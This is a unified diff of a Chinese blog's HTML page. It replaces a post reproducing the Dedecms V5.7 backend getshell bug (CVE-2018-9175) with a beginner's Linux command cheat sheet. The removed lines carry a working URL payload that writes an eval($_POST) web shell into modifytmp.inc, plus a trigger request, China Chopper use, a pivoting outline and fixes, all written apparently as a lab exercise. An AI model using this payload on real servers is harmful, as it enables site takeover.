@@ -23,34 +23,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="针对Dedecms V5.7后台的两处getshell(CVE-2018-9175)的漏洞复现">
+  <meta name="description" content="记录一些用到过的Linux命令">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Dedecms V5.7后台的两处getshell(CVE-2018-9175)">
-<meta property="og:url" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/index.html">
+<meta property="og:title" content="Linux命令合集">
+<meta property="og:url" content="http://example.com/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/index.html">
 <meta property="og:site_name" content="xinkjung&#39;s Blog">
-<meta property="og:description" content="针对Dedecms V5.7后台的两处getshell(CVE-2018-9175)的漏洞复现">
+<meta property="og:description" content="记录一些用到过的Linux命令">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/xinkjung/Photos/raw/???/???.JPG">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??????url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="og:image" content="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url">
-<meta property="article:published_time" content="2021-08-01T08:58:14.000Z">
-<meta property="article:modified_time" content="2021-08-01T08:34:08.466Z">
+<meta property="article:published_time" content="2022-03-14T10:52:49.000Z">
+<meta property="article:modified_time" content="2022-03-15T02:05:29.159Z">
 <meta property="article:author" content="xxx">
-<meta property="article:tag" content="CVE">
-<meta property="article:tag" content="getshell">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/xinkjung/Photos/raw/???/???.JPG">
 
-<link rel="canonical" href="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/">
+<link rel="canonical" href="http://example.com/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/">
 
 
 <script id="page-configurations">
@@ -63,7 +50,7 @@
   };
 </script>
 
-  <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175) | xinkjung's Blog</title>
+  <title>Linux命令合集 | xinkjung's Blog</title>
   
 
 
@@ -218,7 +205,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xin.jpg">
@@ -231,7 +218,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Dedecms V5.7后台的两处getshell(CVE-2018-9175)
+          Linux命令合集
         </h1>
 
         <div class="post-meta">
@@ -240,17 +227,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-08-01 16:58:14。 / 修改时间：16:34:08。" itemprop="dateCreated datePublished" datetime="2021-08-01T16:58:14+08:00">2021-08-01</time>
+              <time title="创建时间：2022-03-14 18:52:49。" itemprop="dateCreated datePublished" datetime="2022-03-14T18:52:49+08:00">2022-03-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-15 10:05:29。" itemprop="dateModified" datetime="2022-03-15T10:05:29+08:00">2022-03-15</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
                 </span>
             </span>
 
@@ -262,7 +255,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
-            <div class="post-description">针对Dedecms V5.7后台的两处getshell(CVE-2018-9175)的漏洞复现</div>
+            <div class="post-description">记录一些用到过的Linux命令</div>
 
         </div>
       </header>
@@ -273,55 +266,44 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
-<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
-<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
-<span id="more"></span>
+        <h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
+<h4 id="2-显示当前路径"><a href="#2-显示当前路径" class="headerlink" title="2. 显示当前路径"></a>2. 显示当前路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<h4 id="3-显示路径下目录列表"><a href="#3-显示路径下目录列表" class="headerlink" title="3. 显示路径下目录列表"></a>3. 显示路径下目录列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 显示当前目录下非隐藏文件列表</span><br><span class="line">ls</span><br><span class="line"># 显示当前目录下所有文件列表（.开头的即为隐藏文件）</span><br><span class="line">ls -a</span><br><span class="line"># 显示并输出为长格式列表</span><br><span class="line">ls -l</span><br><span class="line"># 以长格式列表排列显示文件大小日期等</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure>
 
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
-<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
-<blockquote>
-<p>查看源码，找到漏洞</p>
-</blockquote>
-<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_1.php"></p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_2.php"></p>
-<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
-<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??url" alt="sys_3.php"></p>
-<blockquote>
-<p>写入SHELL并触发</p>
-</blockquote>
-<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、Linux-命令行复制-移动文件-夹"><a href="#二、Linux-命令行复制-移动文件-夹" class="headerlink" title="二、Linux 命令行复制/移动文件(夹)"></a>二、Linux 命令行复制/移动文件(夹)</h3><h4 id="1-复制单个文件到另一个文件夹"><a href="#1-复制单个文件到另一个文件夹" class="headerlink" title="1. 复制单个文件到另一个文件夹"></a>1. 复制单个文件到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>E空文件夹</code> 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /var/www/xin/A.html /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="2-复制文件夹到另一个文件夹"><a href="#2-复制文件夹到另一个文件夹" class="headerlink" title="2. 复制文件夹到另一个文件夹"></a>2. 复制文件夹到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r /var/www/xin/ /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="3-移动文件-夹-到另一个文件夹"><a href="#3-移动文件-夹-到另一个文件夹" class="headerlink" title="3. 移动文件(夹)到另一个文件夹"></a>3. 移动文件(夹)到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如移动 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /var/www/xin/A.html /usr/xxx/ </span><br><span class="line">mv /var/www/xin /usr/xxx</span><br></pre></td></tr></table></figure>
 
-<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="1_payload"></p>
-<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="2_inc"></p>
-<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="三、通过-ssh-拷贝远程-Linux-服务器上文件-夹"><a href="#三、通过-ssh-拷贝远程-Linux-服务器上文件-夹" class="headerlink" title="三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)"></a>三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</h3><h4 id="1-Mac-拷贝服务器文件到本地"><a href="#1-Mac-拷贝服务器文件到本地" class="headerlink" title="1. Mac 拷贝服务器文件到本地"></a>1. Mac 拷贝服务器文件到本地</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝 <code>xxx.xxx.xxx.xxx</code> 服务器上 <code>data.py</code> 文件夹到本地桌面，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user@xxx.xxx.xxx.xxx:/home/user/Desktop/data.py /Users/user/Desktop</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="3_shell"></p>
-<blockquote>
-<p>中国菜刀添加SHELL</p>
-</blockquote>
-<p>很简单吧！嘻嘻嘻！ <img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.1"></p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.2"></p>
-<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq2"></p>
-<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
-<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
-<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
-<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
-<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
-<p>3.及时打补丁，更新补丁。</p>
-<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
-<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq3"></p>
-<p><a href="balabalabbbbbba....">参考链接</a></p>
+<h4 id="2-Mac-拷贝本地文件到服务器"><a href="#2-Mac-拷贝本地文件到服务器" class="headerlink" title="2. Mac 拷贝本地文件到服务器"></a>2. Mac 拷贝本地文件到服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝本地文件 <code>a.jpg</code> 到 <code>xxx.xxx.xxx.xxx</code> 服务器上作为 <code>b.jpg</code>，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /Users/xxx/Desktop/a.jpg user@xxx.xxx.xxx.xxx:/home/user/Desktop/Data/b.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-Mac-拷贝文件夹"><a href="#3-Mac-拷贝文件夹" class="headerlink" title="3. Mac 拷贝文件夹"></a>3. Mac 拷贝文件夹</h4><p>参考以上命令，只需在 <code>scp</code> 后多添加指令参数 <code>–r</code> 即可:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp –r  …</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、Linux-命令行查看-编辑文件"><a href="#四、Linux-命令行查看-编辑文件" class="headerlink" title="四、Linux 命令行查看/编辑文件"></a>四、Linux 命令行查看/编辑文件</h3><p>可以使用 <code>vi</code> 或 <code>vim</code> 查看/编辑文件，后跟文件路径(当前路径直接跟文件名)即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /path/to/file</span><br></pre></td></tr></table></figure>
+<p>这时就进入了指令模式，可以看见文件内容（如果文件存在的话，如果此文件不存在，该命令会创建文件）</p>
+<ul>
+<li>处于光标之下的字符使用 <code>x</code> 字符删除（仅限指令模式）</li>
+<li>按 <code>i</code> 就进入了 <code>编辑insert</code> 模式，便可以开始编辑文本了</li>
+<li>按 <code>ESC</code> 退出编辑模式</li>
+<li>如果没做修改退出文本，键入 <code>:q</code>；做了修改但不保存文本退出，键入 <code>:q!</code>；做了修改并保存退出文本，键入 <code>:wq</code> </li>
+</ul>
+<p>vi 和 vim 都是 Linux 中的编辑器，不同的是 vim 比较高级，可以视为 vi 的升级版本，vi 使用于文本编辑，vim 更适用于 coding 。</p>
 
     </div>
 
@@ -370,7 +352,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/" title="Dedecms V5.7后台的两处getshell(CVE-2018-9175)">http://example.com/2021/08/01/Dedecms V5.7后台的两处getshell(CVE-2018-9175)/</a>
+    <a href="http://example.com/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/" title="Linux命令合集">http://example.com/2022/03/14/Linux命令合集/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -383,10 +365,10 @@
           <div class="post-tags">
               
               
-              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
               
               
-              <a href="/tags/getshell/" rel="tag"><i class="fa fa-tag"></i> getshell</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
           </div>
 
         
@@ -395,13 +377,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/" rel="prev" title="Sublime text3配置PHP">
-      <i class="fa fa-chevron-left"></i> Sublime text3配置PHP
+    <a href="/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/" rel="prev" title="Windows转Mac继续管理GitHub博客">
+      <i class="fa fa-chevron-left"></i> Windows转Mac继续管理GitHub博客
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/" rel="next" title="Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)">
-      Nonecms v1.3后台CSRF漏洞(CVE-2018-7219) <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -460,7 +439,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-text">内网渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#amazing"><span class="nav-text">amazing</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%88%87%E6%8D%A2%E8%B7%AF%E5%BE%84"><span class="nav-text">一、Linux 命令行切换路径</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%87%E6%8D%A2%E7%9B%AE%E5%BD%95"><span class="nav-text">1. 切换目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E8%B7%AF%E5%BE%84"><span class="nav-text">2. 显示当前路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%98%BE%E7%A4%BA%E8%B7%AF%E5%BE%84%E4%B8%8B%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8"><span class="nav-text">3. 显示路径下目录列表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%8D%E5%88%B6-%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6-%E5%A4%B9"><span class="nav-text">二、Linux 命令行复制&#x2F;移动文件(夹)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%A4%8D%E5%88%B6%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-text">1. 复制单个文件到另一个文件夹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-text">2. 复制文件夹到另一个文件夹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6-%E5%A4%B9-%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-text">3. 移动文件(夹)到另一个文件夹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%80%9A%E8%BF%87-ssh-%E6%8B%B7%E8%B4%9D%E8%BF%9C%E7%A8%8B-Linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%96%87%E4%BB%B6-%E5%A4%B9"><span class="nav-text">三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Mac-%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="nav-text">1. Mac 拷贝服务器文件到本地</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Mac-%E6%8B%B7%E8%B4%9D%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2. Mac 拷贝本地文件到服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Mac-%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-text">3. Mac 拷贝文件夹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%9F%A5%E7%9C%8B-%E7%BC%96%E8%BE%91%E6%96%87%E4%BB%B6"><span class="nav-text">四、Linux 命令行查看&#x2F;编辑文件</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
